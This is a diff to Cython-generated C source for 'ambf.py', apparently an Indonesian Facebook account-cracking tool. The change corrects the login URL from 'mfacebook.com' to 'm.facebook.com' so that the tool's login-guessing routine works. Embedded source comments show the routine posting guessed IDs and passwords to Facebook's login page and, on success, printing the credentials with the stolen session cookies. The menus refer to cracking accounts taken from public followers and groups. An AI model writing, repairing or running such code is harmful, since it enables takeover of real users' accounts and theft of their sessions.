@@ -2137,7 +2137,6 @@ static const char __pyx_k_02_crack_dari_pengikut_publik[] = " [02]. crack dari p
 static const char __pyx_k_0_91mAkun_anda_terkunci_0_97m[] = " [!] \033[0;91mAkun anda terkunci\033[0;97m";
 static const char __pyx_k_hasil_CP_disimpan_ke_CP_s_txt[] = " [+] hasil CP disimpan ke : CP/%s.txt\n";
 static const char __pyx_k_hasil_OK_disimpan_ke_OK_s_txt[] = "\n [+] hasil OK disimpan ke : OK/%s.txt";
-static const char __pyx_k_https_mfacebook_com_login_php[] = "https://mfacebook.com/login.php";
 static const char __pyx_k_kata_sandi_minimal_6_karakter[] = "\n [!] kata sandi minimal 6 karakter";
 static const char __pyx_k_login_next_ref_dbl_fl_refid_8[] = "/login/?next&ref=dbl&fl&refid=8";
 static const char __pyx_k_proses_mengambil_100_id_group[] = " [*] proses mengambil 100 id group";
@@ -2148,6 +2147,7 @@ static const char __pyx_k_Api_Key_Kamu_Sudah_Kadaluwarsa[] = " [!] Api Key Kamu 
 static const char __pyx_k_apakah_kamu_yakin_ingin_keluar[] = " [?] apakah kamu yakin ingin keluar? [Y/t]: ";
 static const char __pyx_k_cara_menggunakan_python_run_py[] = " [!] cara menggunakan : python run.py remove";
 static const char __pyx_k_error_tidak_terdeteksi_license[] = " [!] error : tidak terdeteksi license";
+static const char __pyx_k_https_m_facebook_com_login_php[] = "https://m.facebook.com/login.php";
 static const char __pyx_k_isi_me_jika_ingin_lihat_jumlah[] = " [*] isi 'me' jika ingin lihat jumlah teman";
 static const char __pyx_k_lihat_jumlah_total_teman_sudah[] = "\n [*] lihat jumlah total teman sudah selesai";
 static const char __pyx_k_pilih_method_crack_coba_method[] = " \n [ pilih method crack - coba method satu\302\262 ]\n";
@@ -2558,13 +2558,13 @@ static PyObject *__pyx_kp_s_https_graph_facebook_com_s_frien_2;
 static PyObject *__pyx_kp_s_https_graph_facebook_com_s_likes;
 static PyObject *__pyx_kp_s_https_graph_facebook_com_s_subsc;
 static PyObject *__pyx_kp_s_https_m_facebook_com;
+static PyObject *__pyx_kp_s_https_m_facebook_com_login_php;
 static PyObject *__pyx_kp_s_https_mbasic_facebook_com;
 static PyObject *__pyx_kp_s_https_mbasic_facebook_com_2;
 static PyObject *__pyx_kp_s_https_mbasic_facebook_com_browse;
 static PyObject *__pyx_kp_s_https_mbasic_facebook_com_friend;
 static PyObject *__pyx_kp_s_https_mbasic_facebook_com_friend_2;
 static PyObject *__pyx_kp_s_https_mbasic_facebook_com_login;
-static PyObject *__pyx_kp_s_https_mfacebook_com_login_php;
 static PyObject *__pyx_n_s_i;
 static PyObject *__pyx_n_s_id;
 static PyObject *__pyx_kp_s_id_ID_id_q_0_9;
@@ -23239,7 +23239,7 @@ static PyObject *__pyx_pf_4ambf_32mobile(CYTHON_UNUSED PyObject *__pyx_self, PyO
  * 			ses = requests.Session()
  * 			ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})             # <<<<<<<<<<<<<<
  * 			p = ses.get("https://m.facebook.com/")
- * 			b = ses.post("https://mfacebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
+ * 			b = ses.post("https://m.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
  */
         __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_headers); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 643, __pyx_L9_error)
         __Pyx_GOTREF(__pyx_t_11);
@@ -23277,7 +23277,7 @@ static PyObject *__pyx_pf_4ambf_32mobile(CYTHON_UNUSED PyObject *__pyx_self, PyO
  * 			ses = requests.Session()
  * 			ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
  * 			p = ses.get("https://m.facebook.com/")             # <<<<<<<<<<<<<<
- * 			b = ses.post("https://mfacebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
+ * 			b = ses.post("https://m.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
  * 			if "c_user" in ses.cookies.get_dict().keys():
  */
         __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_get); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 644, __pyx_L9_error)
@@ -23303,7 +23303,7 @@ static PyObject *__pyx_pf_4ambf_32mobile(CYTHON_UNUSED PyObject *__pyx_self, PyO
         /* "ambf.py":645
  * 			ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
  * 			p = ses.get("https://m.facebook.com/")
- * 			b = ses.post("https://mfacebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})             # <<<<<<<<<<<<<<
+ * 			b = ses.post("https://m.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})             # <<<<<<<<<<<<<<
  * 			if "c_user" in ses.cookies.get_dict().keys():
  * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
  */
@@ -23327,7 +23327,7 @@ static PyObject *__pyx_pf_4ambf_32mobile(CYTHON_UNUSED PyObject *__pyx_self, PyO
 
         /* "ambf.py":646
  * 			p = ses.get("https://m.facebook.com/")
- * 			b = ses.post("https://mfacebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
+ * 			b = ses.post("https://m.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
  * 			if "c_user" in ses.cookies.get_dict().keys():             # <<<<<<<<<<<<<<
  * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
  * 				print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
@@ -23376,7 +23376,7 @@ static PyObject *__pyx_pf_4ambf_32mobile(CYTHON_UNUSED PyObject *__pyx_self, PyO
         if (__pyx_t_14) {
 
           /* "ambf.py":647
- * 			b = ses.post("https://mfacebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
+ * 			b = ses.post("https://m.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
  * 			if "c_user" in ses.cookies.get_dict().keys():
  * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])             # <<<<<<<<<<<<<<
  * 				print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
@@ -23647,7 +23647,7 @@ static PyObject *__pyx_pf_4ambf_32mobile(CYTHON_UNUSED PyObject *__pyx_self, PyO
 
           /* "ambf.py":646
  * 			p = ses.get("https://m.facebook.com/")
- * 			b = ses.post("https://mfacebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
+ * 			b = ses.post("https://m.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
  * 			if "c_user" in ses.cookies.get_dict().keys():             # <<<<<<<<<<<<<<
  * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
  * 				print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
@@ -30261,13 +30261,13 @@ static __Pyx_StringTabEntry __pyx_string_tab[] = {
   {&__pyx_kp_s_https_graph_facebook_com_s_likes, __pyx_k_https_graph_facebook_com_s_likes, sizeof(__pyx_k_https_graph_facebook_com_s_likes), 0, 0, 1, 0},
   {&__pyx_kp_s_https_graph_facebook_com_s_subsc, __pyx_k_https_graph_facebook_com_s_subsc, sizeof(__pyx_k_https_graph_facebook_com_s_subsc), 0, 0, 1, 0},
   {&__pyx_kp_s_https_m_facebook_com, __pyx_k_https_m_facebook_com, sizeof(__pyx_k_https_m_facebook_com), 0, 0, 1, 0},
+  {&__pyx_kp_s_https_m_facebook_com_login_php, __pyx_k_https_m_facebook_com_login_php, sizeof(__pyx_k_https_m_facebook_com_login_php), 0, 0, 1, 0},
   {&__pyx_kp_s_https_mbasic_facebook_com, __pyx_k_https_mbasic_facebook_com, sizeof(__pyx_k_https_mbasic_facebook_com), 0, 0, 1, 0},
   {&__pyx_kp_s_https_mbasic_facebook_com_2, __pyx_k_https_mbasic_facebook_com_2, sizeof(__pyx_k_https_mbasic_facebook_com_2), 0, 0, 1, 0},
   {&__pyx_kp_s_https_mbasic_facebook_com_browse, __pyx_k_https_mbasic_facebook_com_browse, sizeof(__pyx_k_https_mbasic_facebook_com_browse), 0, 0, 1, 0},
   {&__pyx_kp_s_https_mbasic_facebook_com_friend, __pyx_k_https_mbasic_facebook_com_friend, sizeof(__pyx_k_https_mbasic_facebook_com_friend), 0, 0, 1, 0},
   {&__pyx_kp_s_https_mbasic_facebook_com_friend_2, __pyx_k_https_mbasic_facebook_com_friend_2, sizeof(__pyx_k_https_mbasic_facebook_com_friend_2), 0, 0, 1, 0},
   {&__pyx_kp_s_https_mbasic_facebook_com_login, __pyx_k_https_mbasic_facebook_com_login, sizeof(__pyx_k_https_mbasic_facebook_com_login), 0, 0, 1, 0},
-  {&__pyx_kp_s_https_mfacebook_com_login_php, __pyx_k_https_mfacebook_com_login_php, sizeof(__pyx_k_https_mfacebook_com_login_php), 0, 0, 1, 0},
   {&__pyx_n_s_i, __pyx_k_i, sizeof(__pyx_k_i), 0, 0, 1, 1},
   {&__pyx_n_s_id, __pyx_k_id, sizeof(__pyx_k_id), 0, 0, 1, 1},
   {&__pyx_kp_s_id_ID_id_q_0_9, __pyx_k_id_ID_id_q_0_9, sizeof(__pyx_k_id_ID_id_q_0_9), 0, 0, 1, 0},
@@ -31220,11 +31220,11 @@ static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
   /* "ambf.py":645
  * 			ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
  * 			p = ses.get("https://m.facebook.com/")
- * 			b = ses.post("https://mfacebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})             # <<<<<<<<<<<<<<
+ * 			b = ses.post("https://m.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})             # <<<<<<<<<<<<<<
  * 			if "c_user" in ses.cookies.get_dict().keys():
  * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
  */
-  __pyx_tuple__76 = PyTuple_Pack(1, __pyx_kp_s_https_mfacebook_com_login_php); if (unlikely(!__pyx_tuple__76)) __PYX_ERR(0, 645, __pyx_L1_error)
+  __pyx_tuple__76 = PyTuple_Pack(1, __pyx_kp_s_https_m_facebook_com_login_php); if (unlikely(!__pyx_tuple__76)) __PYX_ERR(0, 645, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__76);
   __Pyx_GIVEREF(__pyx_tuple__76);
 
